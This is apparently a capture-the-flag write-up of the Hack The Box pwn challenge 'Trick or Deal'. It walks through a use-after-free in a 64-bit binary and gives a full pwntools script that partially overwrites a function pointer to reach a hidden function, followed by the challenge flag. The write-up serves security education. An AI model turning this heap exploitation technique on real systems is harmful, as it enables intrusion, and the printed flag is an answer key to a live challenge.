# Trick or Deal
## DESCRIPTION:
Bonnie and his crew arrive to planet Longhir to get equipped with the latest weaponry, but the intergalactic weapon dealer refuses to sell them weapons because he has a trade agreement with Draeger, the Alien Overlord,thus Bonnie has to employ his neat exploitation tricks to persuade the dealer into selling them weapons.
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/trickor/challenge]
└─$ file trick_or_deal
trick_or_deal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=782a7adfe9057b833b6d03e6c72d0d00234b732b, not stripped
```

> BINARY PROTECTIONS

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/trickor/challenge]
└─$ pwn checksec trick_or_deal 
[*] '/home/brandy/Downloads/trickor/challenge/trick_or_deal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

2. After decompiled the binary, found the vuln at the `steal()` function.

> USE AFTER FREE (UAF) VULN

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0459f894-b235-456b-a158-8178edf8bbd9)


3. And it seems our goal is at the `unlock_storage()`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c4be67cc-3490-4434-bfb8-76819fee077c)


4. The pwn concept here is ret2win, but the problem is the PIE enabled and there is no potential overflow. We can leak the PIE at `buy()` by sending 7 bytes, but we won't be able to use it because there is no overflow.
5. Anyway we can still do get inside the `unlock_storage()` using the **UAF** with modifying the last 2 bytes (least significant bytes) of the function pointer. The goal is to change **printstorage** to **unlock_storage**.

#### NOTES:

```
update_weapons() is called at the main(), and it allocates a chunk on the heap. The chunk is saved in a global variable named storage with a size of 80 bytes (0x50) and it copies it's value and a pointer to the printstorage(). (Only in the last 8 bytes). 
```


6. But why printstorage shall be our interest? Here's why:

> WITH GDB - CHECKING THE HEAP CHUNKS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/61265489-8ae5-4c02-b200-5b957478fbc4)


> PROOF (80 sized chunk holds a string and also the printstorage() pointer

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/327b93d0-d395-43c0-88fc-a48fa4fc9505)


### FLOW

```
At first, we free the storage by calling the steal(), since storage is not set to NULL,
hence we can use the chunk later (it just freed, does not remove the contents).

Next we do malloc by calling the make_offer() and make a size of 80 to take the original chunk.
Since we only need the last 2 bytes, hence we can fill the rest (72 buffer) with junk. Now we will get RCE at option 1. 
```

> SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './trick_or_deal'
elf = context.binary = ELF(exe, checksec=True)
#context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()

sh.sendlineafter(b'?', b'4')
sh.sendlineafter(b'?', b'3')
sh.sendlineafter(b':', b'y')
sh.sendlineafter(b'?', b'80') # 0x50

p = flat([
    asm('nop') * 72, #0x48
    # since last 2 bytes hence --> pack 16
    p16(elf.sym['unlock_storage'] & 0xffff) # Overwriting the last 2 bytes 
])

sh.sendafter(b'?', p) ## dunno why it can't send with the \n, but we get RCE without sending the newline.
sh.sendlineafter(b'?', b'1') # get RCEEEE
sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/641dc649-6b51-4c94-aedc-9b0b3469dd93)


> TEST REMOTELY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d505c310-2d8c-45c6-a9c3-be0f622df283)


## FLAG

```
HTB{tr1ck1ng_41nt_ch34t1ng}
```



